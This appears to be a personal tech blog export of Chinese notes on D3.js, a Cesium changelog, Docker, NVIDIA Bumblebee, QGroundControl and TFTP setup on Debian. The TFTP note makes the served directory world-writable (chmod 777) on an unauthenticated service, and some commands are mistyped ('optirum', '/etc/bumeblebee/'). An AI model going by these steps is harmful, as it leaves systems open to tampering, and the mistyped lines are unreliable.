    <content><![CDATA[<p>D3.js（D3或Data-Driven Documents）是一个使用动态图形进行数据可视化的JavaScript程序库。与W3C标准兼容，并且利用广泛实现的SVG、JavaScript和CSS标准，改良自早期的Protovis程序库。与其他的程序库相比，D3对视图结果有很大的可控性。D3是2011年面世的，同年的8月发布了2.0.0版。到2018年4月，D3已被更新到了5.5.0版。</p>
<p>D3.js已被数十万个网站使用，最常被运用在在线新闻网站呈现交互式图形、呈现数据数据的图表和呈现含有地理信息的数据。另外SVG的输出功能也使得D3.js能用于印刷出版物的绘制上。</p>
<h1 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h1><p>D3.js透过预先创建好迁入于网页中的JavaScript函数来选择网页元素、创建SVG元素、调整CSS来呈现数据，并且也可以设置动画、动态改变对象状态或加入工具提示来完成用户交互功能。使用简单的D3.js函数就能够将大型的数据数据结构与SVG对象进行绑定，并且能生成格式化文本和各种图表。其数据数据结构的格式可以是JSON、CSV（以逗号分隔的数据）或GeoJSON，也可以透过自己写JavaScript函数来读取其他或自定义格式的数据，例如Shapefile。</p>
<h1 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h1><ul>
<li>rimraf</li>
</ul>
<p>Node下的Unix命令 rm -rf。</p>
<ul>
<li>json2module</li>
</ul>
<p>将一个JSON对象转换成ES6模块。</p>
<ul>
<li>Rollup</li>
</ul>
<p>Rollup 是一个 JavaScript 模块打包器，可以将小块代码编译成大块复杂的代码，例如 library 或应用程序。Rollup 对代码模块使用新的标准化格式，这些标准都包含在 JavaScript 的 ES6 版本中，而不是以前的特殊解决方案，如 CommonJS 和 AMD。ES6 模块可以使你自由、无缝地使用你最喜爱的 library 中那些最有用独立函数，而你的项目不必携带其他未使用的代码。ES6 模块最终还是要由浏览器原生实现，但当前 Rollup 可以使你提前体验。</p>
<ul>
<li>tape</li>
</ul>
<p>用于nodejs和浏览器的测试工具。</p>
<h1 id="工程模板"><a href="#工程模板" class="headerlink" title="工程模板"></a>工程模板</h1><p>请参考<a href="https://github.com/giorgi-ghviniashvili/d3-project-template" target="_blank" rel="noopener">d3-project-template</a>。</p>
<h1 id="典型代码"><a href="#典型代码" class="headerlink" title="典型代码"></a>典型代码</h1><p>当有数据而没有足够图形元素的时候，使用此方法可以添加足够的元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svg.selectAll(&quot;rect&quot;)   &#x2F;&#x2F;选择svg内所有的矩形</span><br><span class="line">    .data(dataset)      &#x2F;&#x2F;绑定数组</span><br><span class="line">    .enter()            &#x2F;&#x2F;指定选择集的enter部分</span><br><span class="line">    .append(&quot;rect&quot;)     &#x2F;&#x2F;添加足够数量的矩形元素</span><br></pre></td></tr></table></figure>

<p>当数组的长度与元素数量不一致（数组长度 &gt; 元素数量 or 数组长度 &lt; 元素数量）时呢？这时候就需要理解 Update、Enter、Exit 的概念。</p>
<p>如果数组为 [3, 6, 9, 12, 15]，将此数组绑定到三个 p 元素的选择集上。可以想象，会有两个数据没有元素与之对应，这时候 D3 会建立两个空的元素与数据对应，这一部分就称为 Enter。而有元素与数据对应的部分称为 Update。如果数组为 [3]，则会有两个元素没有数据绑定，那么没有数据绑定的部分被称为 Exit。</p>
<h1 id="绘图流程"><a href="#绘图流程" class="headerlink" title="绘图流程"></a>绘图流程</h1><p align="center">
    <img src="images/layout.png" width="80%" alt="D3绘图流程"/>
</p>
<center>图1 D3绘图流程</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://d3js.org/" target="_blank" rel="noopener">Data-Driven Documents</a>,by d3js.</li>
<li><a href="https://zh.wikipedia.org/wiki/D3.js" target="_blank" rel="noopener">D3.js</a>,by wikipedia.</li>
<li><a href="https://github.com/isaacs/rimraf" target="_blank" rel="noopener">rimraf</a>,by isaacs.</li>
<li><a href="https://github.com/mbostock/json2module" target="_blank" rel="noopener">json2module</a>,by mbostock.</li>
<li><a href="https://www.rollupjs.com/guide/introduction/" target="_blank" rel="noopener">Rollup</a>,by rollup.</li>
<li><a href="https://github.com/substack/tape" target="_blank" rel="noopener">tape</a>,by substack.</li>
<li><a href="http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html" target="_blank" rel="noopener">npm scripts 使用指南</a>,by ruanyifeng.</li>
<li><a href="https://juejin.im/post/5c0f67ade51d4536ee0b8878" target="_blank" rel="noopener">Webpack vs Rollup</a>,by 余伯贤.</li>
<li><a href="https://www.cnblogs.com/wuqilang/p/12790800.html" target="_blank" rel="noopener">npm运行项目报错—-Cannot find module ‘@babel/compat-data/corejs3-shipped-proposals’</a>,by 吴小明.</li>
<li><a href="https://www.jianshu.com/p/4a9300009836" target="_blank" rel="noopener">npm install 命令参数的一些简写方式</a>,by 刘予川.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign" target="_blank" rel="noopener">Object.assign()</a>,by mozilla.</li>
<li><a href="https://wiki.jikexueyuan.com/project/d3wiki/enterexit.html" target="_blank" rel="noopener">第十章 理解 Update、Enter、Exit</a>,by 馒头华华.</li>
<li><a href="https://www.ruanyifeng.com/blog/2018/08/svg.html" target="_blank" rel="noopener">SVG 图像入门教程</a>,by ruanyifeng.</li>
<li><a href="https://www.jianshu.com/p/62f691f4811c" target="_blank" rel="noopener">JavaScript视口宽高、元素位置、滚动高度、尺寸属性</a>,by 侠客有情剑无情QAQ.</li>
<li><a href="https://juejin.im/post/5e7855d25188254935094640" target="_blank" rel="noopener">【d3.js-03】shape-饼图</a>,by PolarD.</li>
<li><a href="https://blog.csdn.net/My_Jobs/article/details/43451187" target="_blank" rel="noopener">二叉树遍历（前序、中序、后序、层次遍历、深度优先、广度优先）</a>,by zydoer.</li>
<li><a href="https://segmentfault.com/a/1190000011006780" target="_blank" rel="noopener">D3中常用的比例尺</a>,by 江南陈酒.</li>
<li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">Flex 布局教程：语法篇</a>,by ruanyifeng.</li>
<li><a href="https://www.html.cn/web/javascript/17245.html" target="_blank" rel="noopener">浅谈JavaScript获取元素的大小（高度和宽度）的方法</a>,by html.</li>
<li><a href="https://www.cnblogs.com/lovesong/p/7781033.html" target="_blank" rel="noopener">mouseout、mouseover和mouseleave、mouseenter区别</a>,by 海角在眼前.</li>
<li><a href="https://www.d3-graph-gallery.com/graph/interactivity_tooltip.html" target="_blank" rel="noopener">Building tooltips with d3.js</a>,by d3-graph.</li>
<li><a href="https://www.jianshu.com/p/a52077e8369d" target="_blank" rel="noopener">区分event对象中的[clientX,offsetX,screenX,pageX]</a>,by Rin阳.</li>
<li><a href="https://blog.csdn.net/qq_26222859/article/details/51558300" target="_blank" rel="noopener">position:absolute相对哪个元素定位</a>,by weiqing687.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium摄像头进入地面下问题跟踪</title>
    <url>/2020/09/06/Cesium%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E5%85%A5%E5%9C%B0%E9%9D%A2%E4%B8%8B%E9%97%AE%E9%A2%98%E8%B7%9F%E8%B8%AA/</url>
    <content><![CDATA[<p>Cesium摄像头进入地面下的Bug已经在Cesium 1.66版本中修复。</p>
<h1 id="1-66-0-2020-02-03"><a href="#1-66-0-2020-02-03" class="headerlink" title="1.66.0 - 2020-02-03"></a>1.66.0 - 2020-02-03</h1><h2 id="Deprecated-⏳"><a href="#Deprecated-⏳" class="headerlink" title="Deprecated ⏳"></a>Deprecated ⏳</h2><ul>
<li>The property Scene.sunColor has been deprecated and will be removed in Cesium 1.69. Use scene.light.color and scene.light.intensity instead. #8493</li>
</ul>
<h2 id="Additions-🎉"><a href="#Additions-🎉" class="headerlink" title="Additions 🎉"></a>Additions 🎉</h2><ul>
<li>useBrowserRecommendedResolution flag in Viewer and CesiumWidget now defaults to true. This ensures Cesium rendering is fast and smooth by default across all devices. Set it to false to always render at native device resolution instead at the cost of performance on under-powered devices. #8548</li>
<li>Cesium now creates a WebGL context with a powerPreference value of high-performance. Some browsers use this setting to enable a second, more powerful, GPU. You can set it back to default, or opt-in to low-power mode, by passing the context option when creating a Viewer or CesiumWidget instance:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var viewer &#x3D; new Viewer(&#39;cesiumContainer&#39;, &#123;</span><br><span class="line">    contextOptions : &#123;</span><br><span class="line">        webgl : &#123;</span><br><span class="line">            powerPreference: &#39;default&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
<li>Added more customization to Cesium’s lighting system. #8493<ul>
<li>Added Light, DirectionalLight, and SunLight classes for creating custom light sources.</li>
<li>Added Scene.light for setting the scene’s light source, which defaults to a SunLight.</li>
<li>Added Globe.dynamicAtmosphereLighting for enabling lighting effects on atmosphere and fog, such as day/night transitions. It is true by default but may be set to false if the atmosphere should stay unchanged regardless of the scene’s light direction.</li>
<li>Added Globe.dynamicAtmosphereLightingFromSun for using the sun direction instead of the scene’s light direction when Globe.dynamicAtmosphereLighting is enabled. See the moonlight example in the Lighting Sandcastle example.</li>
<li>Primitives and the globe are now shaded with the scene light’s color.</li>
</ul>
</li>
<li>Updated SampleData models to glTF 2.0. #7802</li>
<li>Added Globe.showSkirts to support the ability to hide terrain skirts when viewing terrain from below the surface. #8489</li>
<li>Added minificationFilter and magnificationFilter options to Material to control texture filtering. #8473<br>Updated earcut to 2.2.1. #8528</li>
<li>Added a font cache to improve label performance. #8537</li>
</ul>
<h2 id="Fixes-🔧"><a href="#Fixes-🔧" class="headerlink" title="Fixes 🔧"></a>Fixes 🔧</h2><ul>
<li><strong>Fixed a bug where the camera could go underground during mouse navigation. #8504</strong></li>
<li>Fixed a bug where rapidly updating a PolylineCollection could result in an instanceIndex is out of range error. #8546</li>
<li>Fixed issue where RequestScheduler double-counted image requests made via createImageBitmap. #8162</li>
<li>Reduced Cesium bundle size by avoiding unnecessarily importing Cesium3DTileset in Picking.js. #8532</li>
<li>Fixed a bug where files with backslashes were not loaded in KMZ files. #8533</li>
<li>Fixed WebGL warning message about EXT_float_blend being implicitly enabled. #8534</li>
<li>Fixed a bug where toggling point cloud classification * visibility would result in a grey screen on Linux / Nvidia. #8538</li>
<li>Fixed a bug where a point in a PointPrimitiveCollection was rendered in the middle of the screen instead of being clipped. #8542</li>
<li>Fixed a crash when deleting and re-creating polylines from CZML. ReferenceProperty now returns undefined when the target entity or property does not exist, instead of throwing. #8544</li>
<li>Fixed terrain tile picking in the Cesium Inspector. #8567</li>
<li>Fixed a crash that could occur when an entity was deleted while the corresponding Primitive was being created asynchronously. #8569</li>
<li>Fixed a crash when calling camera.lookAt with the origin (0, 0, 0) as the target. This could happen when looking at a tileset with the origin as its center. #8571</li>
<li>Fixed a bug where camera.viewBoundingSphere was modifying the offset parameter. #8438</li>
<li>Fixed a crash when creating a plane with both position and normal on the Z-axis. #8576</li>
<li>Fixed BoundingSphere.projectTo2D when the bounding sphere’s center is at the origin. #8482</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/CesiumGS/cesium/issues/5837" target="_blank" rel="noopener">Camera Controller can go underground</a>,by cesium.</li>
<li><a href="https://github.com/CesiumGS/cesium/pull/8504" target="_blank" rel="noopener">Prevent camera from going underground during mouse navigation</a>,by cesium.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian_Linux下安装Docker的方法</title>
    <url>/2018/10/18/Debian-Linux%E4%B8%8B%E5%AE%89%E8%A3%85Docker%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
<p>Docker利用Linux核心中的资源分离机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免启动一个虚拟机造成的额外负担。Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网上、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、存储器、block I/O与网上。</p>
<p>下面即记录在Debian Linux下按照Docker社区版的方法。</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>添加Docker的pgp key。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>

<p>配置Docker的Apt仓库。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br></pre></td></tr></table></figure>

<p>更新Apt仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 清除之前安装的Docker版本</span><br><span class="line">apt-get remove docker docker-engine docker.io</span><br><span class="line">&#x2F;&#x2F; 在安装最新的Docker社区版</span><br><span class="line">apt-get install docker-ce</span><br><span class="line">&#x2F;&#x2F; 测试docker</span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>

<h1 id="以非root用户管理docker"><a href="#以非root用户管理docker" class="headerlink" title="以非root用户管理docker"></a>以非root用户管理docker</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo groupadd docker</span><br><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Docker" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Docker</a> ,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian系统安装NVIDIA驱动支持双显卡切换</title>
    <url>/2018/12/10/Debian%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85NVIDIA%E9%A9%B1%E5%8A%A8%E6%94%AF%E6%8C%81%E5%8F%8C%E6%98%BE%E5%8D%A1%E5%88%87%E6%8D%A2/</url>
    <content><![CDATA[<p>购买笔记本拥有Intel集成显卡和NVIDIA显卡，如何在Debian Linux下启用NVIDIA显卡是一个难题。幸运的是，通过bumblebee软件可在Linux下支持NVIDIA Optimus技术，实现Intel集成显卡和NVIDIA显卡之间的切换使用。</p>
<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="NVIDIA-Optimus"><a href="#NVIDIA-Optimus" class="headerlink" title="NVIDIA Optimus"></a>NVIDIA Optimus</h2><p>Optimus是NVIDIA针对笔记本电脑的显示切换技术。它可以实现笔记本电脑中独立显卡与主板内置显卡之间无缝、自动、实时的切换（用户无需重启或手动调整），从而实现能源的节约。</p>
<p>利用Optimus技术后，计算机的显示输出永远都只会通过集成式芯片组的显示核心。独立显卡的显示输出将会被废掉，有关的输出亦会发送到前者。由于显示输出的设备是固定的，所以黑屏现象将会被解决。额外的切换线路亦变得不需要，因为在不需要独立显示核心的时候，系统会索性断绝其电源供应。当系统的显示负载轻的时候，就会完全利用内置的显示核心。当负载增加后，系统就会打开独立显示核心作计算之用。协议分工方面由驱动程序负责，NVIDIA声称可以兼容所有的API。</p>
<h2 id="Bumblebee"><a href="#Bumblebee" class="headerlink" title="Bumblebee"></a>Bumblebee</h2><p>Bumblebee 致力于使 NVIDIA Optimus 在 GNU/Linux 系统上可用，实现两块不同的供电配置的显卡同时插入使用，共享同一个 framebuffer。</p>
<h1 id="安装配置过程"><a href="#安装配置过程" class="headerlink" title="安装配置过程"></a>安装配置过程</h1><h2 id="禁止加载开源驱动nouveau"><a href="#禁止加载开源驱动nouveau" class="headerlink" title="禁止加载开源驱动nouveau"></a>禁止加载开源驱动nouveau</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vi &#x2F;etc&#x2F;modprobe.d&#x2F;nvidia-installer-disable-nouveau.conf</span><br><span class="line"></span><br><span class="line">#上述文件不存在则新建，在文件中添加下面两行文字</span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset &#x3D; 0</span><br><span class="line"></span><br><span class="line">#系统重启后使用以下命令查看nouveau驱动是否被禁止</span><br><span class="line">lsmod |grep -i nouveau</span><br></pre></td></tr></table></figure>

<h2 id="安装内核头文件"><a href="#安装内核头文件" class="headerlink" title="安装内核头文件"></a>安装内核头文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure>

<h2 id="安装NVIDIA驱动"><a href="#安装NVIDIA驱动" class="headerlink" title="安装NVIDIA驱动"></a>安装NVIDIA驱动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 关于是否生存xorg.conf文件，选no</span><br><span class="line">$ sudo apt-get install  nvidia-driver nvidia-xconfig nvidia-kernel-dkms</span><br></pre></td></tr></table></figure>

<h2 id="安装双显卡切换解决方案包"><a href="#安装双显卡切换解决方案包" class="headerlink" title="安装双显卡切换解决方案包"></a>安装双显卡切换解决方案包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ apt-get install bumblebee-nvidia primus</span><br></pre></td></tr></table></figure>

<h2 id="添加当前用户到bumblebee用户组"><a href="#添加当前用户到bumblebee用户组" class="headerlink" title="添加当前用户到bumblebee用户组"></a>添加当前用户到bumblebee用户组</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ adduser $USER bumblebee</span><br></pre></td></tr></table></figure>

<h2 id="修改bumblebee配置"><a href="#修改bumblebee配置" class="headerlink" title="修改bumblebee配置"></a>修改bumblebee配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vi &#x2F;etc&#x2F;bumeblebee&#x2F;bumblebee.conf</span><br><span class="line">: Driver&#x3D;nvidia</span><br><span class="line"></span><br><span class="line">#将&#x2F;etc&#x2F;bumeblebee&#x2F;bumblebee.conf文件中的Driver&#x3D;* 改成 &#x3D;nvidia</span><br><span class="line"></span><br><span class="line">$ vi &#x2F;etc&#x2F;bumblebee&#x2F;xorg.conf.nvidia</span><br><span class="line">:BusID &quot;PCI:01:00:0&quot; </span><br><span class="line"></span><br><span class="line">#在&#x2F;etc&#x2F;bumblebee&#x2F;xorg.conf.nvidia文件中，将Section“Device”部分添加PCI ID</span><br><span class="line"></span><br><span class="line"># 可使用如下命令查看NVIDIA显卡的BUS ID</span><br><span class="line">nvidia-xconfig --query-gpu-info | grep &#39;BusID : &#39; | cut -d &#39; &#39; -f6</span><br></pre></td></tr></table></figure>

<h2 id="重启进入桌面"><a href="#重启进入桌面" class="headerlink" title="重启进入桌面"></a>重启进入桌面</h2><p>如果无法进入桌面环境，则安装失败，进入高级修复使用如下命令进行清理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get purge nvidia* bumblebee* prime*</span><br></pre></td></tr></table></figure>

<p>bumblebee服务开机不会启动，设置开机启动即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ update-rc.d -f bumblebee defaults</span><br></pre></td></tr></table></figure>

<h1 id="使用独显运行程序"><a href="#使用独显运行程序" class="headerlink" title="使用独显运行程序"></a>使用独显运行程序</h1><p>bumblebee不能做到集显和独显之间自动切换，系统运行时默认使用集显，当你需要使用独显运行某个程序或者游戏的时候，终端执行如下命令即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ optirum command #使用独显运行command程序</span><br><span class="line">$ optirum -b primus command #使用独显运行command程序，提升性能</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/37252268" target="_blank" rel="noopener">kali 在支持双显卡切换机器宏碁（Acer）V3下安装NVIDIA驱动</a>, by 不梦君.</li>
<li><a href="https://github.com/europa502/Installing-Nvidia-drivers-on-Kali-Linux" target="_blank" rel="noopener">Installing-Nvidia-drivers-on-Kali-Linux</a>, by europa502.</li>
<li><a href="https://zh.wikipedia.org/wiki/NVIDIA_Optimus" target="_blank" rel="noopener">NVIDIA Optimus</a>, by wikipedia.</li>
<li><a href="https://linux.cn/article-3946-1.html" target="_blank" rel="noopener">在Ubuntu上安装和配置Nvidia Optimus驱动</a>, by Linux中国.</li>
<li><a href="https://wiki.archlinux.org/index.php/Bumblebee(简体中文)" target="_blank" rel="noopener">Bumblebee</a>,by archlinux.</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian下编译QGroundControl源码</title>
    <url>/2018/11/01/Debian%E4%B8%8B%E7%BC%96%E8%AF%91QGroundControl%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<p>MAVLink（Micro Air Vehicle Link，微型空中飞行器链路通讯协议）是无人飞行器与地面站之间通讯，以及无人飞行器之间通讯最常用的协议。它已经在PX4、APM、PIXHAWK和Parrot AR.Drone飞控平台上进行了大量测试。</p>
<p>QGroundControl则是一种操纵基于MAVLink通信协议的无人机的跨平台地面站开源软件。下面记录在Debian Linux下从源码编译QGroundControl的过程。</p>
<h1 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载QGroundControl源码</span><br><span class="line">git clone --recursive https:&#x2F;&#x2F;github.com&#x2F;mavlink&#x2F;qgroundcontrol.git</span><br><span class="line"># 更新子模块</span><br><span class="line">git submodule update</span><br></pre></td></tr></table></figure>

<h1 id="安装编译环境"><a href="#安装编译环境" class="headerlink" title="安装编译环境"></a>安装编译环境</h1><ul>
<li>下载Qt社区版在线安装器，安装5.11.0版本的Qt，安装路径可在/opt下。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 注意要选择安装5.9+以上版本的Qt，因为构建QGC时需要</span><br><span class="line"># 运行qtcreater</span><br><span class="line">$ cd &#x2F;opt&#x2F;Qt&#x2F;Tools&#x2F;QtCreator&#x2F;bin&#x2F;</span><br><span class="line">$ .&#x2F;qtcreator</span><br></pre></td></tr></table></figure>

<ul>
<li>安装必要的包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install speech-dispatcher libudev-dev libsdl2-dev</span><br></pre></td></tr></table></figure>

<ul>
<li>解决编译时libQt5PositioningQuick.so.5不存在的bug</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libqt5positioningquick5</span><br><span class="line">sudo find &#x2F;usr&#x2F; -name libQt5PositioningQuick.so.5</span><br><span class="line">cp &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libQt5PositioningQuick.so.5 &#x2F;opt&#x2F;Qt&#x2F;5.10.0&#x2F;gcc_64&#x2F;lib&#x2F;libQt5PositioningQuick.so.5</span><br></pre></td></tr></table></figure>

<ul>
<li>将当前用户添加到dialout组，获取串口访问权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 运行QGroundControl需要当前用户拥有串口访问权限</span><br><span class="line">sudo usermod -a -G dialout $USER</span><br></pre></td></tr></table></figure>

<h1 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h1><p>打开Qt Creater，打开qgroundcontrol.pro工程，构建后运行，即可打开QGroundControl地面站软件。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/hebbely/article/details/79022799" target="_blank" rel="noopener">https://blog.csdn.net/hebbely/article/details/79022799</a>,  by hebbely</li>
<li><a href="https://dev.qgroundcontrol.com/en/getting_started/" target="_blank" rel="noopener">https://dev.qgroundcontrol.com/en/getting_started/</a>, by Dronecode</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian安装配置使用TFTP</title>
    <url>/2018/12/30/Debian%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8TFTP/</url>
    <content><![CDATA[<p>简单文件传输协议也称小型文件传输协议（Trivial File Transfer Protocol, TFTP），是一种简化的文件传输协议（FTP），通过少量存储器就能轻松实现。</p>
<h1 id="TFTP技术信息"><a href="#TFTP技术信息" class="headerlink" title="TFTP技术信息"></a>TFTP技术信息</h1><p>小型文件传输协议的一些详细资料：</p>
<ul>
<li>使用UDP（端口69）作为其传输协议（不像FTP使用TCP端口21）。</li>
<li>不能列出目录内容。</li>
<li>无验证或加密机制。</li>
<li>被用于在远程服务器上读取或写入文件。</li>
<li>支持三种不同的传输模式：”netascii”,”octet”和”mail”，前两种匹配FTP协议中的”ASCII”和”image（binary）”模式；第三种从来很少使用，当前已经废弃。</li>
</ul>
<h1 id="TFTP安装"><a href="#TFTP安装" class="headerlink" title="TFTP安装"></a>TFTP安装</h1><p>安装TFTP的客户端和服务器端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install atftp atftpd</span><br></pre></td></tr></table></figure>

<h1 id="TFTP配置"><a href="#TFTP配置" class="headerlink" title="TFTP配置"></a>TFTP配置</h1><ol>
<li>创建TFTP服务器目录</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir &#x2F;tftpboot</span><br><span class="line">sudo chmod 777 &#x2F;tftpboot</span><br><span class="line">sudo chmod 777 &#x2F;tftpboot&#x2F;*</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>编辑TFTP配置文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;default&#x2F;atftpd</span><br><span class="line"></span><br><span class="line"># 修改内容如下，主要是修改目录</span><br><span class="line">USE_INETD&#x3D;false</span><br><span class="line">OPTIONS&#x3D;&quot;--daemon --port 69 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose&#x3D;5 &#x2F;tftpboot&quot;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>重启TFTP守护程序</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;atftpd restart</span><br></pre></td></tr></table></figure>

<h1 id="TFTP测试"><a href="#TFTP测试" class="headerlink" title="TFTP测试"></a>TFTP测试</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ sudo tftp 192.168.43.116</span><br><span class="line">tftp&gt; status</span><br><span class="line">Connected to 192.168.43.116.</span><br><span class="line">Mode: netascii Verbose: off Tracing: off</span><br><span class="line">Rexmt-interval: 5 seconds, Max-timeout: 25 seconds</span><br><span class="line">tftp&gt; get iproad.txt</span><br><span class="line">Received 959 bytes in 0.0 seconds</span><br><span class="line">tftp&gt; put upload.txt</span><br><span class="line">Sent 13 bytes in 0.0 seconds</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/小型文件传输协议" target="_blank" rel="noopener">TFTP</a>,by wikipedia.</li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-using-tftp-install-malicious-software-target-0157547/" target="_blank" rel="noopener">Using TFTP to Install Malicious Software on the Target</a>,by kail forum.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Dell笔记本安装Ubuntu16.04出现的问题及解决方案</title>
    <url>/2019/05/11/Dell%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85Ubuntu16-04%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>PX4开发推荐在Ubuntu16.04上进行，然在一些带独立显卡的笔记本上安装时，进入安装界面就卡住了。问题产生原因显然与显卡驱动有关。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>解决方案可参考链接<a href="https://zhuanlan.zhihu.com/p/29209412" target="_blank" rel="noopener">Ubuntu16.04–64位安装及使用中出现的问题</a>。主要有两种方法：</p>
<ul>
<li>重新开机，光标选中“Install Ubuntu” ，按“e”，进入grub界面，将倒数第二行中的“quiet splash —”改为“nomodeset”。F10保存，就可以进入安装界面，进行安装。</li>
<li>如果加入nomodeset参数不行，则试试加入nouveau.modeset=0，步骤一样。</li>
</ul>
<h1 id="后续维护"><a href="#后续维护" class="headerlink" title="后续维护"></a>后续维护</h1><p>如果能顺利安装，则安装好后，添加选项到/etc/default/grub文件。步骤如下：</p>
